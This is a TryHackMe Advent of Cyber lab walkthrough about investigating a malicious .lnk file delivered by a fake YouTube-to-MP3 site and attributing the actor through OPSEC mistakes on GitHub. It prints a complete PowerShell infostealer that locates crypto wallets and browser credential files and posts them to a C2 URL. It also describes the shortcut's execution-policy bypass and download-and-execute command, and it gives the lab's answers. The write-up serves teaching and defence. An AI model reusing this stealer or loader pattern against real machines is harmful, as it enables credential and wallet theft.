## Learning Objectives
---
- Learn how to investigate malicious link files.
- Learn about OPSEC and OPSEC mistakes.
- Understand how to track and attribute digital identities in cyber investigations.


## Investigating the Website
----
The website we are investigating is a Youtube to MP3 converter currently being shared amongst the organizers of SOC-mas. You've decided to dig deeper after hearing some concerning reports about this website.

![A screenshot of the website.](https://tryhackme-images.s3.amazonaws.com/user-uploads/62ff64c3c859dc0042b2b9f6/room-content/62ff64c3c859dc0042b2b9f6-1730738103063.png)

At first glance, the website looks legit and presentable. The About Page even says that it was made by "The Glitch ". How considerate of them to make our job easier!

Scrolling down, you'll see the feature list, which promises to be "Secure" and "Safe." From our experience, that isn't very likely.

## Youtube to MP3 Converter Websites
----
These websites have been around for a long time. They offer a convenient way to extract audio from YouTube videos, making them popular. However, historically, these websites have been observed to have significant risks, such as:

```ad-danger
- **Malvertising**: Many sites contain malicious ads that can exploit vulnerabilities in a user's system, which could lead to infection.
- **Phishing scams**: Users can be tricked into providing personal or sensitive information via fake surveys or offers.
- **Bundled malware**: Some converters may come with malware, tricking users into unknowingly running it.
```

What nefarious thing does this website have in store for us?

## Getting Some Tunes

Let's find out by pasting any YouTube link in the search form and pressing the "Convert" button. Then select either`mp3 or mp4`
option. This should download a file that we could use to investigate. For example, we can use [https://www.youtube.com/watch?v=dQw4w9WgXcQ](https://www.youtube.com/watch?v=dQw4w9WgXcQ), a classic if you ask me. 


![A screenshot presenting extraction of a zip archive.](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/63588b5ef586912c7d03c4f0-1731073491258.png) 

You'll now see two extracted two files:`song.mp3` and`somg.mp3`.

To quickly determine the file's contents, double-click on the "Terminal" icon on the desktop then run the`file` command on each one. First, let's try checking`song.mp3`.

![Pasted image 20241201140254.png](../../IMAGES/Pasted%20image%2020241201140254.png)

![Pasted image 20241201140326.png](../../IMAGES/Pasted%20image%2020241201140326.png)

There doesn't seem to be anything suspicious, according to the output. As expected, this is just an MP3 file.

How about the second file`somg.mp3`? From the filename alone, we can tell something is not right. Still, let's confirm by running the`file` command on it anyway.

![Pasted image 20241201140345.png](../../IMAGES/Pasted%20image%2020241201140345.png)

Now, this is more interesting!

The output tells us that instead of an MP3, the file is an "MS Windows shortcut", also known as a`.lnk` file. This file type is used in Windows to link to another file, folder, or application. These shortcuts can also be used to run commands! If you've ever seen the shortcuts on a Windows desktop, you already know what they are.

There are multiple ways to inspect`.lnk` files to reveal the embedded commands and attributes. For this room, however, we'll use`ExifTool`, which is already installed on this machine.

![Pasted image 20241201140434.png](../../IMAGES/Pasted%20image%2020241201140434.png)

```ad-info
What this PowerShell command does:

- The`-ep Bypass -nop` flags disable PowerShell's usual restrictions, allowing scripts to run without interference from security settings or user profiles.
- The`DownloadFile` method pulls a file (in this case,`IS.ps1`) from a remote server ([https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1](https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1)) and saves it in the`C:\\ProgramData\\` directory on the target machine.
- Once downloaded, the script is executed with PowerShell using the`iex` command, which triggers the downloaded`s.ps1` file.
```

If you visit the contents of the file to be downloaded using your browser (`https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1`), you will see just how lucky we are that we are not currently using Windows.


```powershell
function Print-AsciiArt {
 Write-Host " ____ _ ___ _____ ___ _ _ "
 Write-Host " / ___| | | |_ _||_ _| / __| | | | |" 
 Write-Host "| | _ | | | | | | | | | |_| |"
 Write-Host "| |_| | | |___ | | | | | |__ | _ |"
 Write-Host " \____| |_____| |___| |_| \___| |_| |_|"

 Write-Host " Created by the one and only M.M."
}

# Call the function to print the ASCII art
Print-AsciiArt

# Path for the info file
$infoFilePath = "stolen_info.txt"

# Function to search for wallet files
function Search-ForWallets {
 $walletPaths = @(
 "$env:USERPROFILE\.bitcoin\wallet.dat",
 "$env:USERPROFILE\.ethereum\keystore\*",
 "$env:USERPROFILE\.monero\wallet",
 "$env:USERPROFILE\.dogecoin\wallet.dat"
 )
 Add-Content -Path $infoFilePath -Value "`n### Crypto Wallet Files ###"
 foreach ($path in $walletPaths) {
 if (Test-Path $path) {
 Add-Content -Path $infoFilePath -Value "Found wallet: $path"
 }
 }
}

# Function to search for browser credential files (SQLite databases)
function Search-ForBrowserCredentials {
 $chromePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
 $firefoxPath = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\logins.json"

 Add-Content -Path $infoFilePath -Value "`n### Browser Credential Files ###"
 if (Test-Path $chromePath) {
 Add-Content -Path $infoFilePath -Value "Found Chrome credentials: $chromePath"
 }
 if (Test-Path $firefoxPath) {
 Add-Content -Path $infoFilePath -Value "Found Firefox credentials: $firefoxPath"
 }
}

# Function to send the stolen info to a C2 server
function Send-InfoToC2Server {
 $c2Url = "http://papash3ll.thm/data"
 $data = Get-Content -Path $infoFilePath -Raw

 # Using Invoke-WebRequest to send data to the C2 server
 Invoke-WebRequest -Uri $c2Url -Method Post -Body $data
}

# Main execution flow
Search-ForWallets
Search-ForBrowserCredentials
Send-InfoToC2Server
```


The script is designed to collect highly sensitive information from the victim's system, such as cryptocurrency wallets and saved browser credentials, and send it to an attacker's remote server.

```ad-bug
Disclaimer: All content in this room, including CPP code, PowerShell scripts, and commands, is provided solely for educational purposes. Please do not execute these on a Windows host.
```

This looks fairly typical of a PowerShell script for such a purpose, with one notable exception: a signature in the code that reads.

> **Created by the one and only M.M.**

## Searching the Source
---
There are many paths we could take to continue our investigation. We could investigate the website further, analyze its source code, or search for open directories that might reveal more information about the malicious actor's setup. We can search for the hash or signature on public malware databases like VirusTotal or Any.Run. Each of these methods could yield useful clues.

However, for this room, we'll try something a bit different. Since we already have the PowerShell code, searching for it online might give us useful leads. It's a long shot, but we'll explore it in this exercise.

There are many places where we can search for code. The most widely used is GitHub. So let's try searching there.

To search effectively, we can look for unique parts of the code that we could use to search with. The more distinctive, the better. For this scenario, we have the string we've uncovered before that reads:

**"Created by the one and only M.M."**

Search for this on Github.com or by going directly to this link: [https://github.com/search?q=%22Created+by+the+one+and+only+M.M.%22&type=issues](https://github.com/search?q=%22Created+by+the+one+and+only+M.M.%22&type=issues)

![GitHub search results page based on the keywords indicated.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/5fc2847e1bbebc03aa89fbf2-1729863090396.png) 

You'll notice something interesting if you explore the pages in the search results.

```ad-note
### Note!

If you receive an error below, it's because Github has rate limits in place if you are not signed in. To fix this, you can just sign in with a GitHub account or skip directly to the next step by going here: [https://github.com/Bloatware-WarevilleTHM/CryptoWallet-Search/issues/1](https://github.com/Bloatware-WarevilleTHM/CryptoWallet-Search/issues/1) ![GitHub error message requesting the user to login to access the resource.](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/63588b5ef586912c7d03c4f0-1730268658469.png) 

If you look through the search results, you can be able infer the malicious actor's identity based on information on the project's page and the GitHub Issues section.

```

![Pasted image 20241201141051.png](../../IMAGES/Pasted%20image%2020241201141051.png)

Aha! Looks like this user has made a critical mistake.

## Introduction to OPSEC
---
This is a classic case of OPSEC failure.

Operational Security (OPSEC) is a term originally coined in the military to refer to the process of protecting sensitive information and operations from adversaries. The goal is to identify and eliminate potential vulnerabilities before the attacker can learn their identity.

In the context of cyber security, when malicious actors fail to follow proper OPSEC practices, they might leave digital traces that can be pieced together to reveal their identity. Some common OPSEC mistakes include:

```ad-important
- Reusing usernames, email addresses, or account handles across multiple platforms. One might assume that anyone trying to cover their tracks would remove such obvious and incriminating information, but sometimes, it's due to vanity or simply forgetfulness.
- Using identifiable metadata in code, documents, or images, which may reveal personal information like device names, GPS coordinates, or timestamps.
- Posting publicly on forums or GitHub (Like in this current scenario) with details that tie back to their real identity or reveal their location or habits.
- Failing to use a VPN or proxy while conducting malicious activities allows law enforcement to track their real IP address.
```

You'd think that someone doing something bad would make OPSEc their top priority, but they're only human and can make mistakes, too.

For example, here are some real-world OPSEC mistakes that led to some really big fails:

### AlphaBay Admin Takedown
----
One of the most spectacular OPSEC failures involved Alexandre Cazes, the administrator of AlphaBay, one of the largest dark web marketplaces:

```ad-info
- Cazes used the email address "[pimp_alex_91@hotmail.com](mailto:pimp_alex_91@hotmail.com)" in early welcome emails from the site.
- This email included his year of birth and other identifying information.
- He cashed out using a Bitcoin account tied to his real name.
- Cazes reused the username "Alpha02" across multiple platforms, linking his dark web identity to forum posts under his real name.
```

### Chinese Military Hacking Group (APT1)
---
There's also the notorious Chinese hacking group APT1, which made several OPSEC blunders:

```ad-info
- One member, Wang Dong, signed his malware code with the nickname "Ugly Gorilla".
- This nickname was linked to programming forum posts associated with his real name.
- The group used predictable naming conventions for users, code, and passwords.
- Their activity consistently aligned with Beijing business hours, making their location obvious.
```

These failures provided enough information for cyber security researchers and law enforcement to publicly identify group members.

## Uncovering MM
---
If you've thoroughly investigated the GitHub search result, you should have uncovered several clues based on poor OPSEC practices by the malicious actor.

We know the attacker left a distinctive signature in the PowerShell code (MM). This allowed us to search for related repositories and issues pages on GitHub. We then discovered an Issues page where the attacker engaged in discussions, providing more context and linking their activity to other projects.

![Pasted image 20241201141322.png](../../IMAGES/Pasted%20image%2020241201141322.png)

In this discussion, they responded to a query about modifying the code. This response, paired with their unique handle, was another critical slip-up, leaving behind a trail of evidence that can be traced back to them. By analyzing the timestamps, usernames, and the nature of their interactions, we can now attribute the mastermind behind the attack to MM.

## What's Next?
---
_McSkidy dug deeper,_ _her mind sharp and quick,_

_

_But something felt off, a peculiar trick._

_The pieces sheâ€™d gathered just didnâ€™t align,_

_A puzzle with gaps, a tangled design._

_

As McSkidy continued digging, a pattern emerged that didn't fit the persona she was piecing together. A different handle appeared in obscure places, buried deep in the details: "MM."

"Who's MM?" McSkidy muttered, the mystery deepening.

Even though all signs on the website seemed to point to Glitch as the author, it became clear that someone had gone to great lengths to ensure Glitch's name appeared everywhere. Yet, the scattered traces left by MM suggested a deliberate effort to shift the blame.



## Questions
---


![Pasted image 20241201141430.png](../../IMAGES/Pasted%20image%2020241201141430.png)

![Pasted image 20241201141441.png](../../IMAGES/Pasted%20image%2020241201141441.png)

We got `Tyler Ramsbey`

![Pasted image 20241201141458.png](../../IMAGES/Pasted%20image%2020241201141458.png)

Analyzing the GitHub conversation between MM and the other user, we found this:

![Pasted image 20241201141526.png](../../IMAGES/Pasted%20image%2020241201141526.png)

C2 server URL is: `http://papash3ll.thm/data`

![Pasted image 20241201141555.png](../../IMAGES/Pasted%20image%2020241201141555.png)

Let's take a look at MM's GitHub profile:

![Pasted image 20241201141642.png](../../IMAGES/Pasted%20image%2020241201141642.png)

We found two repositories, first one is the malware we've already analyzed, second one is a repository containing the configuration files for MM's GitHub profile, let's check it:

![Pasted image 20241201141738.png](../../IMAGES/Pasted%20image%2020241201141738.png)

We found that M.M is known as `Mayor Malware`


Just like that, Day 1 of Advent of Cyber is done!

